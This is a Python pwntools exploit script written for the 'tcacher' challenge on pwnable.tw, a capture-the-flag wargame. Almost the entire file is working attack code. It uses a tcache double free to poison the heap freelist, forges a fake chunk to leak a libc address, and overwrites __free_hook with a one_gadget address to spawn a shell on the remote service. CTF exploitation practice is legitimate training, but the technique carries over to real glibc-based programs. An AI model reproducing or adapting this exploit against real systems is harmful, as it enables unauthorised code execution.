# -*- coding: utf-8 -*-
from pwn import *
import sys 
context.terminal = ["tmux","splitw","-hp","60","-F","#{pane_pid}","-P"]
# exe = context.binary = ELF('./tcacher')
sys.argv[0] = exe = './tcacher'
lib = "/root/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6"
elf = ELF(exe)
libc = ELF(lib)
host = 'chall.pwnable.tw'
port = 10207
if args.I:
    context.log_level='debug'
def local():
    return process(sys.argv)
def remote():
    return connect(host, port)
start = remote if args.R else local

def one_gadget():
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f', '-l', '2',lib]),encoding = "utf-8").split(' ')
    # print(one_ggs)
    return (list(map(int,one_ggs)))

p   = lambda      : pause() 
s   = lambda x    : success(x)
re  = lambda m    : io.recv(numb=m)
ru  = lambda x    : io.recvuntil(x)
rl  = lambda      : io.recvline()
sd  = lambda x    : io.send(x)
sl  = lambda x    : io.sendline(x)
ia  = lambda      : io.interactive()
sla = lambda a, b : io.sendlineafter(a, b)
sa  = lambda a, b : io.sendafter(a, b)
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))

#==================================================
def add(size,data):
    sla("Your choice :" , '1')
    sla("Size:" , str(size))
    sla("Data:" , data)
def delete():
    sla("Your choice :" , '2')
def show():
    sla("Your choice :" , '3')
def exit():
    sla("Your choice :" , '4')
name = 0x0000000000602060

io = start()
sla("Name:" , p64(0) + p64(0x501))
add(0x50,'a'*24)
delete()
delete()
add(0x50,p64(name+0x500))
add(0x50,p64(name+0x500))
add(0x50,(p64(0)+p64(0x21)*2)*2)

add(0x60,'a')
delete()
delete()
# gdb.attach(io)
add(0x60,p64(name+0x10))
# add(0x60,'a')
add(0x60,"ld1ng")
add(0x60,"ld1ng")

delete()
show()
ru(p64(0x501))
libc_base = uu64(re(6))-96-0x10-libc.sym["__malloc_hook"]
free_hook = libc_base + libc.sym["__free_hook"]
# og = [0x4f2c5,0x4f322,0x10a38c]
og = one_gadget()
print(og)
rce = libc_base + og[1]
info("libc_base: " + hex(libc_base))
info("free_hook: " + hex(free_hook))
info("rce: " + hex(rce))
gdb.attach(io)
add(0x70,'a')
delete()
delete()
add(0x70,p64(free_hook))
add(0x70,"ld1ng")
add(0x70,p64(rce))
add(0x80,"test")

delete()

io.interactive()
